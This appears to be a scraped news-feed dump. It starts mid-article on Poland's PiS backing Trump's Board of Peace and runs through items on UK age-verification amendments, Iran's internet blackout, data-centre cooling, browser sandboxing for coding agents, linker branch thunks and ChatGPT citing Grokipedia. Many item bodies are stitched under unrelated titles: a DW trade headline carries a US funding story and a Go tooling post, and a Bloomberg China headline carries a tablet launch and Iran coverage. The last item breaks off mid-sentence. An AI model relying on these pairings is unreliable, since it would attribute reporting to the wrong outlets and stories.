We cannot do what we do without your support.Jarosław Kaczyński, the leader of Poland’s national-conservative opposition Law and Justice (PiS) party, has expressed his support for Poland joining Donald Trump’s Board of Peace, saying that it would help ensure good relations with the United States.He also called on the government to pay the $1 billion required for a permanent seat.Last week, PiS-aligned President Karol Nawrocki revealed that he had received an invitation from Trump to join the board. However, as joining an international organisation requires approval by the government and parliament, the president began the process of consultation with the foreign ministry.Nawrocki and PiS are closely aligned with Trump, but the government, a more liberal coalition ranging from left to centre-right, has less friendly relations with Washington. Both sides are also wary of joining a body that Russia’s Vladimir Putin and Belarus’s Alexander Lukashenko have been invited to.Nawrocki attended Thursday’s launch of the Board of Peace at the World Economic Forum in Davos. He was not among those who formally joined the body, but said afterwards that it was “important and necessary” for Poland to be part of it.On Friday, that position was echoed by Kaczyński. “We must be on the best possible terms with the United States, which is all the more reason why we should be there [on the Board of Peace],” said the PiS leader.“The government must allocate this billion dollars, because there’s no point in Poland joining as a poor country,” he added. “We are no longer a poor country and should act as a truly full member.”Trump has invited dozens of world leaders to join the board, which was established as part of the peace process in Gaza but has a much wider remit. Those wishing to have permanent membership are expected to pay $1 billion.Asked if Nawrocki should sit on the board even if Putin is a fellow member, Kaczyński simply replied, “Vladimir Putin won’t be there”, without offering further explanation.The government has so far not outlined its position on whether it supports joining the board or not. In response to Kaczyński’s remarks on Friday, foreign minister Radosław Sikorski launched a poll on social media platform X asking his followers what they think.Among the 21,000 responses, the most popular of the three options Sikorski gave was “Let PiS pay for it themselves” (48.2%), followed by “No, there are more important goals” (30.5%) and then “Yes, this is in our interest” (21.3%)Other leaders of large European countries have rejected the idea of joining the board in its current form, including France’s Emmanuel Macron, British Prime Minister Keir Starmer, Italy’s Giorgia Meloni, and German Chancellor Friedrich Merz.More than 20 countries have so far accepted invitations to join the body. They include Israel, Hungary, Argentina, Saudi Arabia, Turkey, Belarus, Pakistan and Mongolia. Russia has said it is still considering the offer.Belarus and Russia’s membership of the board would be problematic for Warsaw, given that both countries have in recent years been engaged in a campaign of so-called “hybrid warfare” against Poland.Agents working on behalf of Russia have carried out sabotage and cyberattacks, while Belarus has created a migration and security crisis on Poland’s eastern border by encouraging and assisting tens of thousands of migrants – mainly from the Middle East, Asia and Africa – to try to illegally cross.

Only a few forms of communication, such as email, SMS, MMS, and one-to-one live voice calls, are explicitly excluded.While political messaging around the vote often described the move as a “social media ban for under-16s,” the actual scope is considerably wider.In effect, most interactive online platforms would now need to collect and verify age data from users, even where those services are not primarily aimed at children.This represents a major expansion of identity checks across digital infrastructure, once considered neutral or privacy-protective, and one of the most disciplinarian proposals in the West.Two key amendments advanced during the Lords debate on January 21.Amendment 92 (“Action to Prohibit the Provision of VPN Services to Children in the United Kingdom”) requires VPNs that are “offered or marketed to persons in the United Kingdom” or “provided to a significant number of persons” to implement age assurance for UK users.The measure passed by 207 Content votes to 159 Not Content votes.Amendment 94a (“Action to Promote the Wellbeing of Children in Relation to Social Media”) mandates that all regulated user-to-user services introduce age assurance systems to prevent under-16s from “becoming or being users.” This proposal passed with 261 Content votes to 150 Not Content votes.Both amendments will proceed to the Bill’s next stage, the third reading in the House of Lords.Two other amendments, both more technologically intrusive, were discussed but rejected.Amendment 93, introduced by Lord Nash, would have compelled smartphone and tablet manufacturers, distributors, and importers to install “tamper-proof system software which is highly effective at preventing the recording, transmitting (by any means, including livestreaming) and viewing of CSAM using that device.”The only plausible way to enforce such a measure would be through constant, automated inspection of every photo, video, and stream on a device. This form of surveillance would have converted personal devices into continuous content monitors, raising severe privacy and accuracy concerns, including potential false positives.Lord Nash stated: “On Amendment 93, I have had a constructive discussion with Ministers on this issue and more discussions are in progress, so I will not push that to a vote today.”Amendment 108, proposed by Lord Storey, would have required user-to-user services “likely to be accessed by children” to set their own minimum age thresholds and use age assurance to enforce them.He argued that a single blanket ban under Amendment 94a was overly rigid. “Having different minimum ages for different platforms would be a better solution,” he said, maintaining that his version would be more effective in practice.Neither of these amendments passed, leaving Amendments 92 and 94a as the only ones to advance.The discussion highlights a deepening push within UK legislation to merge digital identity checks with online participation.While described as safeguarding children, the changes embed a new layer of identity verification across tools once used for privacy, such as VPNs.These services, designed to conceal personal browsing data and protect against profiling, would now face obligations to verify who their users are. This is a contradiction that could erode one of the few remaining shields for private internet use.For now, the most invasive surveillance measure, client-side scanning, has been set aside. However, the fact that it was seriously considered indicates continuing interest in embedding scanning mechanisms directly into personal devices.Whether similar proposals reappear during the third reading remains to be seen.]]></content:encoded></item><item><title>Dollar Decline Doesn&apos;t Need State Help: 3-Minute MLIV</title><link>https://www.youtube.com/watch?v=i4mnargm6Gs</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/i4mnargm6Gs?version=3" length="" type=""/><pubDate>Mon, 26 Jan 2026 09:01:00 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg</source><content:encoded><![CDATA[Anna Edwards, Guy Johnson, Tom Mackenzie and Mark Cudmore break down today's key themes for analysts and investors on "Bloomberg: The Opening Trade."

"The changes could be devastating for publishers who rely heavily on Discover for referral traffic. And it looks set to accelerate a global trend of declining traffic to publishers from both Google search and Discover."

Xavi Beumala from website analytics platform Marfeel warned in a research update: "Google Discover is no longer a publisher-first surface. It's becoming an AI platform with YouTube and X absorbing real estate that once went to newsrooms..." [They warn later that "This is not a marginal UI experiment. It is a reallocation of feed real estate away from links and toward inline Youtube plays and generated summaries."] Google says it prioritises "helpful, reliable, people-first content". Unlike Google News, there is no requirement that Google Discover showcases bona fide publisher websites. 

In recent months fake news stories published by fraudulent website publishers have been promoted on Google Discover, reaping tens of millions of clicks. Google said it was working on a "fix" for this issue... 

Facebook, Instagram and Tiktok content may also start flowing into the Discover feed in future. When Google announced the addition of posts from X, Instagram and Youtube Shorts in September, it said there would be "more platforms to come".]]></content:encoded></item><item><title>Study finds many software developers feel ethical pressure to ship products that may conflict with democratic values</title><link>https://www.tandfonline.com/doi/full/10.1080/1369118X.2025.2566814</link><author>/u/SentFromHeav3n</author><category>reddit</category><pubDate>Mon, 26 Jan 2026 08:26:52 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Go lang course</title><link>https://www.reddit.com/r/golang/comments/1qna80v/go_lang_course/</link><author>/u/Durga_81</author><category>golang</category><category>reddit</category><pubDate>Mon, 26 Jan 2026 08:11:57 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Can someone please suggest a best go pang course in udemy I am a beginner I want to build my career as Go lang developer    submitted by    /u/Durga_81 ]]></content:encoded></item><item><title>EU leaders von der Leyen and Costa to sign substantial trade and defense deal with India | DW News</title><link>https://www.youtube.com/watch?v=xIUGv5Ya-_0</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/xIUGv5Ya-_0?version=3" length="" type=""/><pubDate>Mon, 26 Jan 2026 08:11:23 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[The European Union is set to conclude a major free trade deal with the world's most populous nation, India.

Senate Democratic leader Chuck Schumer vowed to block the spending package unless Republicans strip funding for the DHS. Unless Democrats or Republicans relent, funding of much of the government would lapse on Jan. 31, disrupting operations at numerous agencies. Bloomberg's Jon Herskovitz reports.

Like it doesnt know you always do if err != nil a certain way or how you structure your Gin handlers or whatever patterns youve established in your codebase.What this does is scan your code with tree sitter, figure out your patterns, then expose all that to Claude/Cursor/Copilot through MCP. So when you ask it to write something it actually knows how YOU do things.Works with Gin, Echo, Fiber, Chi, standard net/http. For data stuff it picks up GORM, sqlx, database/sql, ent.The Go specific stuff it tracks:error handling patterns (your if err != nil style, how you wrap errors, custom error types) interface implementations goroutine usage defer patterns struct and method organizationWhen you ask "add a new endpoint" the AI calls drift_context and gets back your actual route patterns, your middleware setup, your error handling, real examples from your code. Then generates something that fits.Got a CLI too if you want to poke around yourselfAll the docs are on the wiki if you want to try it:8 languages total now (TS, Python, Java, C#, PHP, Go, Rust, C++), 45+ MCP tools, full call graph stuff.Anyway happy to answer questions about how it works. Tree sitter parsing with regex fallback for edge cases, the whole thing runs local so your code stays on your machine.]]></content:encoded></item><item><title>Startup Uses SpaceX Tech to Cool Data Centers With Less Power and No Water</title><link>https://hardware.slashdot.org/story/26/01/26/0317225/startup-uses-spacex-tech-to-cool-data-centers-with-less-power-and-no-water?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>EditorDavid</author><category>tech</category><pubDate>Mon, 26 Jan 2026 05:44:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[California-based Karman Industries "says it has developed a cooling system that uses SpaceX rocket engine technology to rein in the environmental impact of data centers," reports the Los Angeles Times, "chilling them with less space, less power and no water."


Karman has developed a cooling system similar to the heat pumps in the average home, except its pumps use liquid carbon dioxide as refrigerant, which is circulated using rocket engine technology rather than fans. The company's efficient pumps can reduce the space required for data center cooling equipment by 80%. 

Over the years, data centers have used fans and air conditioning to blow cold air on the chips. Bigger facilities pass cold liquid through tubes near the chips to absorb the heat. This hot liquid is sent outside to a cooling yard, where sprawling networks of pipes use as much water as a city of 50,000 people to remove the heat. A 50 megawatt data center also uses enough electricity to power a mid-sized city... Cooling systems account for up to 40% of a data center's power consumption and an average midsized data center consumes more than 35,000 gallons of water per day... 

U.S. data centers will consume about 8% of all electricity in the country by 2030, according to the International Energy Agency... The cooling systems are projected to use up to 33 billion gallons of water by 2028 per year... To serve this seemingly insatiable market, Karman has developed a rotating compressor that spins at 30,000 revolutions per minute — nearly 10 times faster than traditional compressors — to move heat... 

About a third of Karman's 23-person team came from SpaceX or Rocket Lab, and they co-opted technologies from aerospace engineering and electric vehicles to design the mechanics for the high-speed motors. The system uses a special type of carbon dioxide under high pressure to transfer heat from the data center to the outside air. Depending on the conditions, it can do the same amount of cooling using less than half the energy. Karman's heat pump can either reject heat to air, or route it into extra cooling, or even power generation. 
The company "recently raised $20 million," according to the article, "and expects to start building its first compressors in Long Beach later this year...."]]></content:encoded></item><item><title>The browser is the sandbox</title><link>https://simonwillison.net/2026/Jan/25/the-browser-is-the-sandbox/</link><author>enos_feedler</author><category>hn</category><pubDate>Mon, 26 Jan 2026 05:23:01 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[. Paul Kinlan is a web platform developer advocate at Google and recently turned his attention to coding agents. He quickly identified the importance of a robust sandbox for agents to operate in and put together these detailed notes on how the web browser can help:This got me thinking about the browser. Over the last 30 years, we have built a sandbox specifically designed to run incredibly hostile, untrusted code from anywhere on the web, the instant a user taps a URL. [...]Could you build something like Cowork in the browser? Maybe. To find out, I built a demo called Co-do that tests this hypothesis. In this post I want to discuss the research I've done to see how far we can get, and determine if the browser's ability to run untrusted code is useful (and good enough) for enabling software to do more for us directly on our computer.Paul then describes how the three key aspects of a sandbox - filesystem, network access and safe code execution - can be handled by browser technologies: the File System Access API (still Chrome-only as far as I can tell), CSP headers with  and WebAssembly in Web Workers.Co-do is a very interesting demo that illustrates all of these ideas in a single application:You select a folder full of files and configure an LLM provider and set an API key, Co-do then uses CSP-approved API calls to interact with that provider and provides a chat interface with tools for interacting with those files. It does indeed feel similar to Claude Cowork but without running a multi-GB local container to provide the sandbox.My biggest complaint about  remains how thinly documented it is, especially across different browsers. Paul's post has all sorts of useful details on that which I've not encountered elsewhere, including a complex double-iframe technique to help apply network rules to the inner of the two frames.Thanks to this post I also learned about the <input type="file" webkitdirectory> tag which turns out to work on Firefox, Safari  Chrome and allows a browser read-only access to a full directory of files at once. I had Claude knock up a webkitdirectory demo to try it out and I'll certainly be using it for projects in the future.Posted 25th January 2026 at 11:51 pm]]></content:encoded></item><item><title>Xi Purges Top General on Corruption Charges | The China Show 1/26/2026</title><link>https://www.youtube.com/watch?v=ClHn_u6UPX8</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/ClHn_u6UPX8?version=3" length="" type=""/><pubDate>Mon, 26 Jan 2026 05:20:34 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg</source><content:encoded><![CDATA[“Bloomberg: The China Show” is your definitive source for news and analysis on the world's second-biggest economy.

Earlier Brax Technologies built the privacy-focused smartphone BraX3, which co-founder Plamen Todorov says proved "a privacy-focused mobile device could be designed, crowdfunded, manufactured, and delivered outside the traditional Big Tech ecosystem."


Just as importantly, BraX3 showed us the value of building with the community. The feedback we received — what worked, what didn't, and what people wanted next — played a major role in shaping our direction going forward. Today, we're ready to share the next step in that journey...

 

They're promising their "2-in-1" open_slate tablet will be built with these guiding principles:


Modularity beyond repairability". ("In addition to a user-replaceable battery, it supports an M.2 expansion slot, allowing users to customize storage and configurations to better fit their needs.")
Hardware-level privacy and control, with physical switches allowing users to disable key components like wireless radios, sensors, microphones, and cameras.
Multi-OS compatibility, supporting "multiple" Android-based operating systems as well as native Linux distributions. ("We're working with partners and the community to ensure proper, long-term OS support rather than one-off ports.")
Longevity by design — a tablet that's "supported over time"
Brax has already created an open thread with preliminary design specs. "The planned retail price is 599$ for the base version and 799$ for the Pro version," they write. "We will be offering open_slate (both versions) at a discount during our pre-order campaign, starting as low as 399$ for the base version and 529$ for the Pro version for limited quantities only which may sell out in a day or two from launching pre-orders... 

"Pre-orders will open in February, via IndieGoGo. Make sure to subscribe for notifications if you don't want to miss the launch date."

Filterwatch, which monitors Iranian internet censorship from Texas, cited government sources, including Mohajerani, saying access will “never return to its previous form.”This is what makes Iran’s attempt unique: Other authoritarian states built walls before their populations went online. Iran is trying to seal off a connected economy already in freefall. The system is called Barracks Internet, according to confidential planning documents obtained by Filterwatch. Under this architecture, access to the global web will be granted only through a strict security whitelist.“The regime is terrified of one thing: Iranians being heard telling their own truth and having crimes documented,” Mahsa Alimardani, a digital rights researcher at U.S.-based Witness, which trains activists to use video for advocacy, told . “The question becomes: How do we give Iranians an unbreakable voice?”The idea of tiered internet access is not new in Iran. Since at least 2013, the regime has quietly issued “white SIM cards,” giving unrestricted global internet access to approximately 16,000 people. The system gained public attention in November 2025 when X’s location feature revealed that certain accounts, including the communications minister, were connecting directly from inside Iran, despite X being blocked since 2009.What is different now is scale and permanence. The current blackout tests infrastructure designed to make two-tier access the default, not a temporary crackdown.Only a handful of nations have attempted to wall off their citizens from the global internet. North Korea’s Kwangmyong intranet was built from scratch for a population that never had connectivity. China constructed its Great Firewall over two decades while nurturing domestic alternatives such as WeChat and Alibaba. Iran is attempting to do both in weeks, with no domestic alternatives.The question becomes: How do we give Iranians an unbreakable voice?”The economic costs of the blackout are staggering. Iran’s deputy communications minister pegged the daily losses at as much as $4.3 million. NetBlocks estimates the true cost exceeds $37 million daily. More than 10 million Iranians depend directly on digital platforms for their livelihoods.Tipax, one of Iran’s largest private delivery companies handling about 320,000 daily shipments before the protests, now processes fewer than a few hundred, according to Filterwatch. The company operates a nationwide logistics network comparable to FedEx in the U.S. market.The government fired Irancell’s CEO for failing to comply with shutdown orders. Irancell, the country’s second-largest mobile operator with 66 million subscribers, is partly owned by South Africa’s MTN Group. Alireza Rafiei was removed for disobeying orders on “restriction of internet access in crisis situations,” according to Fars news agency.Foreign telecom partners have left Iran in recent days under security escort, without media coverage, according to Filterwatch. This may signal the end of international cooperation in critical infrastructure, replaced by the Revolutionary Guard’s construction arm or limited cooperation with Huawei.Technical experts doubt the regime can sustain Barracks Internet without crippling the economy. Georgia Tech’s Internet Intelligence Lab, which has tracked Iran’s shutdowns since the Arab Spring, called the blackout “the most sophisticated and most severe in Iran’s history.” Its measurements show about 3% connectivity persists, likely government officials and state services.We need to revolutionize access to the internet.”Kaveh Ranjbar, former chief technology officer at RIPE NCC, the body managing European internet infrastructure, calls the plan a “digital airlock” that can’t fully seal a modern economy. No country has hermetically sealed a functioning digital economy, he told .Activists have smuggled an estimated 50,000 Starlink satellite terminals into Iran since 2022, when the Biden administration exempted the service from sanctions. SpaceX has made the service free for Iranian users. The government claims it cut off 40,000 Starlink connections and jammed some terminals during the blackout, though others remain operational after firmware updates to bypass government blocking. Still, the technology remains vulnerable to signal jamming, meaning the regime holds ultimate leverage.“We need to revolutionize access to the internet,” said Alimardani. “And move beyond the limiting structures and norms of ‘internet sovereignty.’”]]></content:encoded></item><item><title>Long branches in compilers, assemblers, and linkers</title><link>https://maskray.me/blog/2026-01-25-long-branches-in-compilers-assemblers-and-linkers</link><author>/u/MaskRay</author><category>reddit</category><pubDate>Mon, 26 Jan 2026 04:17:24 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Branch instructions on most architectures use PC-relative addressing
with a limited range. When the target is too far away, the branch
becomes "out of range" and requires special handling.Consider a large binary where  at address 0x10000
calls  at address 0x8010000-over 128MiB away. On
AArch64, the  instruction can only reach ±128MiB, so this
call cannot be encoded directly. Without proper handling, the linker
would fail with an error like "relocation out of range." The toolchain
must handle this transparently to produce correct executables.This article explores how compilers, assemblers, and linkers work
together to solve the long branch problem.Compiler (IR to assembly): Handles branches within a function that
exceed the range of conditional branch instructionsAssembler (assembly to relocatable file): Handles branches within a
section where the distance is known at assembly timeLinker: Handles cross-section and cross-object branches discovered

compiler emits a single  for calls and relies on its

and rely on linker relaxation to shrink the sequence when possible.The  range (±1MiB) is notably smaller than other RISC
architectures (AArch64 ±128MiB, PowerPC64 ±32MiB, LoongArch ±128MiB).
This limits the effectiveness of linker relaxation ("start large and
shrink"), and leads to frequent trampolines when the compiler
optimistically emits  ("start small and grow").Compare and branch (, ): ±64

±4GiBWith ±4GiB range for long forms, z/Architecture doesn't need linker
range extension thunks. LLVM's  pass
relaxes short branches (/) to long
forms (/) when targets are out of
range.Conditional branch instructions usually have shorter ranges than
unconditional ones, making them less suitable for linker thunks (as we
will explore later). Compilers typically keep conditional branch targets
within the same section, allowing the compiler to handle out-of-range
cases via branch relaxation.Within a function, conditional branches may still go out of range.
The compiler measures branch distances and relaxes out-of-range branches
by inverting the condition and inserting an unconditional branch:Some architectures have conditional branch instructions that compare
with an immediate, with even shorter ranges due to encoding additional
immediates. For example, AArch64's /
(compare and branch if zero/non-zero) and
/ (test bit and branch) have only
±32KiB range. RISC-V Zibi / have ±4KiB
range. The compiler handles these in a similar way:An Intel employee contributed https://reviews.llvm.org/D41634 (in 2017) when inversion
of a branch condintion is impossible. This is for an out-of-tree
backend. As of Jan 2026 there is no in-tree test for this code path.In LLVM, this is handled by the  pass,
which runs just before . Different backends have
their own implementations:: AArch64, AMDGPU, AVR, RISC-V: Hexagon: PowerPC: SystemZ: MIPSThe generic  pass computes block sizes
and offsets, then iterates until all branches are in range. For
conditional branches, it tries to invert the condition and insert an
unconditional branch. For unconditional branches that are still out of
range, it calls TargetInstrInfo::insertIndirectBranch to
emit an indirect jump sequence (e.g.,
++ on AArch64) or a long
jump sequence (e.g., pseudo  on RISC-V).Note: The size estimates may be inaccurate due to inline assembly.
LLVM uses heuristics to estimate inline assembly sizes, but for certain
assembly constructs the size is not precisely known at compile time.Unconditional branches and calls can target different sections since
they have larger ranges. If the target is out of reach, the linker can
insert thunks to extend the range.For x86-64, the large code model uses multiple instructions for calls
and jumps to support text sections larger than 2GiB (see Relocation
overflow and code models: x86-64 large code model). This is a
pessimization if the callee ends up being within reach. Google and Meta
Platforms have interest in allowing range extension thunks as a
replacement for the multiple instructions.Assembler: instruction
relaxationThe assembler converts assembly to machine code. When the target of a
branch is within the same section and the distance is known at assembly
time, the assembler can select the appropriate encoding. This is
distinct from linker thunks, which handle cross-section or cross-object
references where distances aren't known until link time.Span-dependent instructions: Select an appropriate
encoding based on displacement.
On x86, a short jump () can be relaxed to a
near jump () when the target is far.On RISC-V,  may be assembled to the 2-byte
 when the displacement fits within ±256 bytes.Conditional branch transform: Invert the condition
and insert an unconditional branch. On RISC-V, a  might
be relaxed to  plus an unconditional branch.The assembler uses an iterative layout algorithm that alternates
between fragment offset assignment and relaxation until all fragments
become legalized. See Integrated
assembler improvements in LLVM 19 for implementation details.Linker: range extension
thunksWhen the linker resolves relocations, it may discover that a branch
target is out of range. At this point, the instruction encoding is
fixed, so the linker cannot simply change the instruction. Instead, it
generates  (also called veneers,
branch stubs, or trampolines).A thunk is a small piece of linker-generated code that can reach the
actual target using a longer sequence of instructions. The original
branch is redirected to the thunk, which then jumps to the real
destination.Range extension thunks are one type of linker-generated thunk. Other
types include:Short range vs long range
thunksA  (see lld/ELF's AArch64
implementation) contains just a single branch instruction. Since it
uses a branch, its reach is also limited by the branch range—it can only
extend coverage by one branch distance. For targets further away,
multiple short range thunks can be chained, or a long range thunk with
address computation must be used.Long range thunks use indirection and can jump to (practically)
arbitrary locations.Thunk impact on
debugging and profilingThunks are transparent at the source level but visible in low-level
tools:: May show thunk symbols (e.g.,
) between caller and callee: Samples may attribute time to thunk
code; some profilers aggregate thunk time with the target function:  or
 will show thunk sections interspersed with
regular code: Each thunk adds bytes; large binaries

.Some architectures take a different approach: instead of only
expanding branches, the linker can also 
instruction sequences when the target is close enough. RISC-V and
LoongArch both use this technique. See The
dark side of RISC-V linker relaxation for a deeper dive into the
complexities and tradeoffs.Consider a function call using the 
pseudo-instruction, which expands to  +
: If  is within ±1MiB, the linker can relax this to:
This is enabled by  relocations that
accompany  relocations. The
 relocation signals to the linker that this
instruction sequence is a candidate for shrinking.Example object code before linking: After linking with relaxation enabled, the 8-byte
+ pairs become 4-byte
 instructions: When the linker deletes instructions, it must also adjust:Subsequent instruction offsets within the sectionOther relocations that reference affected locationsAlignment directives ()This makes RISC-V linker relaxation more complex than thunk
insertion, but it provides code size benefits that other architectures
cannot achieve at link time.LoongArch uses a similar approach. A
+ sequence
(, ±128GiB range) can be relaxed to a single
 instruction (, ±128MiB range)
when the target is close enough.Diagnosing out-of-range
errorsWhen you encounter a "relocation out of range" error, check the
linker diagnostic and locate the relocatable file and function.
Determine how the function call is lowered in assembly.Handling long branches requires coordination across the
toolchain:Invert condition + add unconditional jumpInvert condition + add unconditional jumpShrink + to 
(RISC-V)The linker's thunk generation is particularly important for large
programs where function calls may exceed branch ranges. Different
linkers use different algorithms with various tradeoffs between
complexity, optimality, and robustness.Linker relaxation approaches adopted by RISC-V and LoongArch is an
alternative that avoids range extension thunks but introduces other
complexities.]]></content:encoded></item><item><title>&quot;Make Adobe Creative Cloud run on Linux&quot;, I thought. &quot;It&apos;ll be a fun project/puzzle&quot;, I thought.</title><link>https://www.reddit.com/r/linux/comments/1qn54wn/make_adobe_creative_cloud_run_on_linux_i_thought/</link><author>/u/QwertyChouskie</author><category>reddit</category><pubDate>Mon, 26 Jan 2026 03:45:01 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[I'm slowly losing what marbles of mine remain...]]></content:encoded></item><item><title>Environmentalists worry Google behind bid to control Oregon town&apos;s water</title><link>https://www.sfgate.com/national-parks/article/mount-hood-water-google-21307223.php</link><author>voxadam</author><category>hn</category><pubDate>Mon, 26 Jan 2026 03:40:06 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Studying ESP32 firmware, feels like Go isn’t really used in production</title><link>https://www.reddit.com/r/golang/comments/1qn4ve6/studying_esp32_firmware_feels_like_go_isnt_really/</link><author>/u/ConsiderationMean593</author><category>golang</category><category>reddit</category><pubDate>Mon, 26 Jan 2026 03:33:15 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I’ve been studying ESP32 firmware lately.I like Go a lot and naturally looked into TinyGo and other Go-based approaches.They’re interesting and fun to experiment with.But when I look at how firmware is actually written in production,almost everything still seems to be C or C++.It doesn’t feel like people “hate” Go,more like the ecosystem, tooling, and long-term trust just aren’t there yet for firmware.Curious if anyone here has seen Go used seriously in ESP32 or embedded projects,or if it’s still mostly a hobby / experiment space.]]></content:encoded></item><item><title>The Dambusters Raid Explained</title><link>https://shows.acast.com/dansnowshistoryhit/episodes/the-dambusters-raid</link><author></author><category>podcast</category><enclosure url="https://sphinx.acast.com/p/acast/s/dansnowshistoryhit/e/6967a54840cb06a2d4f95619/media.mp3?tk=eyJ0ayI6ImRlZmF1bHQiLCJhZHMiOnRydWUsInNwb25zIjp0cnVlLCJzdGF0dXMiOiJwdWJsaWMifQ==&amp;sig=mX74FJ6L7q9Y15VO-76yntEwsxuj4cx9m2RL86FhFmk" length="" type=""/><pubDate>Mon, 26 Jan 2026 03:00:00 +0000</pubDate><source url="https://www.historyhit.com/podcasts/">Podcast - HistoryHit</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>supermemoryai/supermemory</title><link>https://github.com/supermemoryai/supermemory</link><author></author><pubDate>Mon, 26 Jan 2026 02:54:37 +0000</pubDate><source url="http://mshibanami.github.io/GitHubTrendingRSS">Github Trending</source><content:encoded><![CDATA[Memory engine and app that is extremely fast, scalable.

The discovery has surprised many in the tech community, especially given the ongoing rivalry between OpenAI and Musk’s AI ventures.The development has triggered discussions around AI transparency, source reliability, and how large language models decide which information to trust.Grokipedia Enters ChatGPT’s Source PoolGrokipedia launched in  as an AI-driven alternative to Wikipedia. According to Elon Musk, the project was built to counter what he believes are ideological biases in traditional encyclopedias. Unlike Wikipedia, Grokipedia is fully generated by artificial intelligence and does not allow human editing.Recent testing by multiple publications found that ChatGPT cited Grokipedia several times while answering user queries. These citations appeared across topics such as political structures, historical figures, and academic subjects.Notably, ChatGPT did not rely on Grokipedia for highly sensitive or widely documented topics. Instead, it appeared more frequently in responses related to niche or lesser-known subjects, where fewer authoritative sources are available online.OpenAI states that ChatGPT draws from a wide range of publicly available and licensed data. However, Grokipedia’s AI-only editorial process has raised concerns among researchers and fact-checkers. Without human oversight, errors or biased interpretations may be harder to identify and correct.Several studies have questioned Grokipedia’s sourcing standards, noting instances of weak citations and inconsistent references. When AI models reuse content from AI-generated platforms, there is a risk of reinforcing inaccuracies, especially when those sources gain visibility through search indexing.Blurring Lines Between Rival AI PlatformsDespite public tensions between OpenAI and xAI, this situation highlights how interconnected the AI ecosystem has become. Algorithms do not account for corporate competition. They prioritize relevance, availability, and indexing signals, regardless of who created the content.AI researchers point out that modern language models often surface content that is highly indexed or frequently referenced online. If Grokipedia continues to grow in visibility, it may increasingly appear in AI-generated responses.Some academics warn that AI-generated encyclopedias could redefine how authority is established online, shifting trust from human editorial systems to algorithmic outputs that lack traditional accountability.For users, the takeaway is simple. AI-generated answers should always be verified. Cross-checking important information with trusted sources remains essential, especially when unfamiliar citations appear in responses.As AI systems continue integrating more live web data, questions around source quality, filtering, and accountability will become increasingly important. The emergence of Grokipedia as a referenced source highlights the growing challenge of balancing open information access with accuracy and trust.]]></content:encoded></item><item><title>Megathread Submission Cosmic Al: GitHub Repo Scanner to Quantify Tech Debt in Dollars - Early Feedback?</title><link>http://cosmic-ai.pages.dev/</link><author>/u/Tech_News_Blog</author><category>golang</category><category>reddit</category><pubDate>Mon, 26 Jan 2026 02:18:20 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[

This was 2016, before LLMs. No powerful GPUs with HBM and Google's first TPU is cutting edge. Transformers didn't exist. It seems much better than other contemporary chatbots like SimSimi. It adapts to user engagement and user generated text very quickly, adjusting the text it generates which is grammatically coherent and apparently context appropriate and contains information unlike SimSimi. There is zero information on its inner workings. Could it just have been RL on an RNN trained on text and answer pairs? Maybe Markov chains too? How can an AI model like this learn continuously? Could it have used Long short-term memory?

They cite a recently-accepted merge request from a KDE engineer to drop the code supporting FreeBSD, since the login manager relies on systemd/logind:

systemd and logind look like hard dependencies of the login manager, which means the software is built to work exclusively with these components and cannot function without them... logind is a component of systemd that is responsible for user session management... 
 This doesn't mean that KDE has abandoned the operating system altogether. FreeBSD users can still run the KDE Plasma desktop environment and continue using SDDM, the current login manager that works just fine on such systems. 

The article argues FreeBSD users "won't really care much for missing out on this as they have plenty of login manager options available."]]></content:encoded></item><item><title>Power outages due to snowfall, Thousands of flights canceled or delayed | DW News</title><link>https://www.youtube.com/watch?v=WC0Fe4mviZM</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/WC0Fe4mviZM?version=3" length="" type=""/><pubDate>Mon, 26 Jan 2026 01:45:02 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[A massive winter storm is sweeping across the US.

Now, scientists have linked a specific set of brain waves in a certain part of the brain to a sense of body ownership.In a series of new experiments, researchers from Sweden and France put 106 participants through what's called the rubber hand illusion, monitoring and stimulating their brain activity to see what effect it had.This classic illusion involves hiding one of a participant's hands from their view and replacing it with a rubber one instead. When both their real and fake hands are repeatedly touched at the same time, it can evoke the eerie sensation that the rubber hand is part of the person's body."We have identified a fundamental brain process that shapes our continuous experience of being embodied," says lead author Mariano D'Angelo, a neuroscientist at Karolinska Institute in Sweden."The findings may provide new insights into psychiatric conditions such as  schizophrenia, where the sense of self is disturbed."In the first batch of experiments, participants had a robotic arm tap the index finger of their real and fake hands, either at the exact same time or with a delay of up to 500 milliseconds between each tap.As expected, participants reported feeling that the fake hand was part of their body more strongly if the taps were synchronized, and the feeling steadily weakened as the gap widened between what they felt and what they saw.The EEG readings from the second experiment added more detail to the story. The frequency of alpha waves in the parietal cortex seemed to correlate with how well participants could detect the time delay between taps.Those with faster alpha waves appeared to rule out fake hands 